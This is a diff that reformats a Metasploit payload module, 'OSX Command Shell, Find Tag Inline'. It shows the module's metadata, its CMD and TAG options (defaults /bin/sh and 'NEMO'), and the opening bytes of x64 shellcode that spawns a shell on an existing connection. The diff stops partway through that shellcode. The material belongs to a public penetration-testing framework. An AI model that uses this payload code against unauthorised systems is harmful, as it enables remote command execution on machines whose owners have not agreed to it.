@@ -3,9 +3,7 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 module MetasploitModule
-
   CachedSize = 107
 
   include Msf::Payload::Single
@@ -13,34 +11,36 @@ module MetasploitModule
   include Msf::Sessions::CommandShellOptions
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'          => 'OSX Command Shell, Find Tag Inline',
-      'Description'   => 'Spawn a shell on an established connection (proxy/nat safe)',
-      'Author'        => 'nemo <nemo[at]felinemenace.org>',
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'osx',
-      'Arch'          => ARCH_X64,
-      'Handler'       => Msf::Handler::FindTag,
-      'Session'       => Msf::Sessions::CommandShellUnix
-
-      ))
-      # exec payload options
-      register_options(
-        [
-          OptString.new('CMD',  [ true,  "The command string to execute", "/bin/sh" ]),
-          OptString.new('TAG',  [ true,  "The tag to test for", "NEMO" ]),
-      ])
+    super(
+      merge_info(
+        info,
+        'Name' => 'OSX Command Shell, Find Tag Inline',
+        'Description' => 'Spawn a shell on an established connection (proxy/NAT safe)',
+        'Author' => 'nemo <nemo[at]felinemenace.org>',
+        'License' => MSF_LICENSE,
+        'Platform' => 'osx',
+        'Arch' => ARCH_X64,
+        'Handler' => Msf::Handler::FindTag,
+        'Session' => Msf::Sessions::CommandShellUnix
+      )
+    )
+    # exec payload options
+    register_options(
+      [
+        OptString.new('CMD', [ true, 'The command string to execute', '/bin/sh' ]),
+        OptString.new('TAG', [ true, 'The tag to test for', 'NEMO' ]),
+      ]
+    )
   end
 
   #
   # ensures the setting of tag to a four byte value
   #
   def generate(_opts = {})
-    cmd  = (datastore['CMD'] || '') + "\x00"
+    cmd = (datastore['CMD'] || '') + "\x00"
     call = "\xe8" + [cmd.length].pack('V')
 
-    payload =
-      "\x48\x31\xFF" +                    # xor rdi,rdi
+    "\x48\x31\xFF" + # xor rdi,rdi
       "\x57" +                            # push rdi
       "\x48\x89\xE6" +                    # mov rsi,rsp
       "\x6A\x04" +                        # push byte +0x4
